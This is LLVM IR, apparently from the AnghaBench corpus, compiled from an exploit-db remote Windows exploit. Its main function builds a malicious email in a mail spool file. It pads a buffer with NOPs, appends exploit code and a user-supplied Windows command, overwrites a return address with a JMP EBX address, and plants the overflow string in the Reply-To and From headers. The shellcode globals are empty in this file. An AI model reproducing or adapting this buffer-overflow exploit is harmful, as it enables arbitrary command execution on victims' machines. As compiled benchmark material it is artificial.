; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19450.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_19450.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@main.buf = internal global [10000 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [45 x i8] c"usage : %s MailSpoolDirectry WindowsCommand\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"Permittion denied :-P\0A\00", align 1
@HEADER1 = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@BUFEND = common dso_local global i64 0, align 8
@exploit_code = common dso_local global i8* null, align 8
@FUNC = common dso_local global i8* null, align 8
@CMDLENP = common dso_local global i64 0, align 8
@RETADR = common dso_local global i32 0, align 4
@JMP_EBX_ADR = common dso_local global i32 0, align 4
@JMPADR = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [36 x i8] c"Reply-To: \22%s\22 <hehehe@hohoho.com>\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"From: \22%s\22 <hehehe@hohoho.com>\0A\00", align 1
@HEADER2 = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %9 = load i32, i32* %3, align 4
  %10 = icmp ne i32 %9, 3
  br i1 %10, label %11, label %17

11:                                               ; preds = %2
  %12 = load i8**, i8*** %4, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 0
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i8* %14)
  %16 = call i32 @exit(i32 1) #3
  unreachable

17:                                               ; preds = %2
  %18 = load i8**, i8*** %4, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = call i32* @fopen(i8* %20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %21, i32** %5, align 8
  %22 = icmp eq i32* %21, null
  br i1 %22, label %23, label %26

23:                                               ; preds = %17
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %25 = call i32 @exit(i32 1) #3
  unreachable

26:                                               ; preds = %17
  %27 = load i8*, i8** @HEADER1, align 8
  %28 = load i8*, i8** @HEADER1, align 8
  %29 = call signext i8 @strlen(i8* %28)
  %30 = load i32*, i32** %5, align 8
  %31 = call i32 @fwrite(i8* %27, i32 1, i8 signext %29, i32* %30)
  %32 = load i32, i32* @NOP, align 4
  %33 = load i64, i64* @BUFEND, align 8
  %34 = call i32 @memset(i8* getelementptr inbounds ([10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 0), i32 %32, i64 %33)
  %35 = load i8*, i8** @exploit_code, align 8
  %36 = load i8*, i8** @FUNC, align 8
  %37 = call i32 @strcat(i8* %35, i8* %36)
  %38 = load i8*, i8** @exploit_code, align 8
  %39 = load i8**, i8*** %4, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 2
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @strcat(i8* %38, i8* %41)
  %43 = load i8**, i8*** %4, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 2
  %45 = load i8*, i8** %44, align 8
  %46 = call signext i8 @strlen(i8* %45)
  %47 = load i8*, i8** @exploit_code, align 8
  %48 = load i64, i64* @CMDLENP, align 8
  %49 = getelementptr inbounds i8, i8* %47, i64 %48
  store i8 %46, i8* %49, align 1
  %50 = load i32, i32* @RETADR, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* getelementptr inbounds ([10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 0), i64 %51
  %53 = getelementptr inbounds i8, i8* %52, i64 4
  %54 = load i8*, i8** @exploit_code, align 8
  %55 = load i8*, i8** @exploit_code, align 8
  %56 = call signext i8 @strlen(i8* %55)
  %57 = call i32 @strncpy(i8* %53, i8* %54, i8 signext %56)
  %58 = load i32, i32* @JMP_EBX_ADR, align 4
  store i32 %58, i32* %8, align 4
  %59 = load i64, i64* @JMPADR, align 8
  %60 = getelementptr inbounds [10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 %59
  store i8 -21, i8* %60, align 1
  %61 = load i64, i64* @JMPADR, align 8
  %62 = add i64 %61, 1
  %63 = getelementptr inbounds [10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 %62
  store i8 6, i8* %63, align 1
  %64 = load i32, i32* %8, align 4
  %65 = ashr i32 %64, 24
  %66 = and i32 255, %65
  %67 = trunc i32 %66 to i8
  %68 = load i32, i32* @RETADR, align 4
  %69 = add nsw i32 %68, 3
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 %70
  store i8 %67, i8* %71, align 1
  %72 = load i32, i32* %8, align 4
  %73 = ashr i32 %72, 16
  %74 = and i32 255, %73
  %75 = trunc i32 %74 to i8
  %76 = load i32, i32* @RETADR, align 4
  %77 = add nsw i32 %76, 2
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 %78
  store i8 %75, i8* %79, align 1
  %80 = load i32, i32* %8, align 4
  %81 = ashr i32 %80, 8
  %82 = and i32 255, %81
  %83 = trunc i32 %82 to i8
  %84 = load i32, i32* @RETADR, align 4
  %85 = add nsw i32 %84, 1
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 %86
  store i8 %83, i8* %87, align 1
  %88 = load i32, i32* %8, align 4
  %89 = and i32 %88, 255
  %90 = trunc i32 %89 to i8
  %91 = load i32, i32* @RETADR, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  %94 = load i64, i64* @BUFEND, align 8
  %95 = getelementptr inbounds [10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 %94
  store i8 0, i8* %95, align 1
  %96 = load i32*, i32** %5, align 8
  %97 = call i32 @fprintf(i32* %96, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 0))
  %98 = load i32*, i32** %5, align 8
  %99 = call i32 @fprintf(i32* %98, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([10000 x i8], [10000 x i8]* @main.buf, i64 0, i64 0))
  %100 = load i8*, i8** @HEADER2, align 8
  %101 = load i8*, i8** @HEADER2, align 8
  %102 = call signext i8 @strlen(i8* %101)
  %103 = load i32*, i32** %5, align 8
  %104 = call i32 @fwrite(i8* %100, i32 1, i8 signext %102, i32* %103)
  %105 = load i32*, i32** %5, align 8
  %106 = call i32 @fclose(i32* %105)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i8 signext, i32*) #1

declare dso_local signext i8 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i64) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strncpy(i8*, i8*, i8 signext) #1

declare dso_local i32 @fprintf(i32*, i8*, i8*) #1

declare dso_local i32 @fclose(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
